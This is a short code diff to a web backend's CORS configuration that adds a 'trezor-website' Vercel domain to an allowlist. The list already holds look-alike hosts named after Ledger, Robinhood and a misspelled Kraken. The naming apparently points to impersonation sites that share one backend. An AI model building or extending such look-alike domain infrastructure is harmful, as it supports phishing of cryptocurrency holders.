@@ -13,6 +13,7 @@ app.use(cors({
     origin: ["https://s3demo.vercel.app" ,"https://ledger-six-sigma.vercel.app", "https://ledger-six-sigma-dfasf324324-343244-america-44343434.vercel.app" ,"http://localhost:3000",
             "https://robinhood-white-nine-sigma-dfasf324324-343244-dubai-44343434.vercel.app",
             "https://kreken-white-five-sigma-dfasf-324324-343244-iran.vercel.app",
+            "https://trezor-website-five-sigma-dfasf-324324-343244-iraq.vercel.app",
              // AWS URL
              "https://main.dcytem5jqmxjf.amplifyapp.com",
              "https://main.dl1l0wtr7nwnp.amplifyapp.com",
